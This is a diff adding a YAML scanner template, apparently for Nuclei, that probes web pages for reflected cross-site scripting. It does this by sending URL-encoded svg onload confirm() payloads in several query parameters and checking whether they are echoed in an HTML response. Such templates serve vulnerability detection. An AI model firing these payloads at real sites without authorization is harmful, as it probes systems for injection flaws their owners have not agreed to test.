@@ -1,0 +1,57 @@
+id: poc-yaml-fuzz-testing-xss-3
+info:
+  name: 模糊测试3 XSS漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: xss
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 500
+      - type: word
+        part: header
+        words:
+          - "text/html"
+
+  - raw:
+      - |
+        GET /?{{payload}} HTTP/1.1
+        Host: {{Hostname}}
+
+    attack: clusterbomb
+    payloads:
+      payload:
+        - "image=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-image%27%29%3E&id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-id%27%29%3E"
+        - "order=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-order%27%29%3E&sid=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-sid%27%29%3E"
+        - "language=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-language%27%29%3E&filter=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-filter%27%29%3E"
+        # Add more payloads as needed
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 500
+      - type: word
+        part: body
+        words:
+          - "'>\"<svg/onload=confirm('xss-"
+      - type: word
+        part: header
+        words:
+          - "text/html"
+      - type: regex
+        part: body
+        regex:
+          - "(?i)<title>Access Denied</title>"
+          - "(?i)You don't have permission to access"
+        negative: true
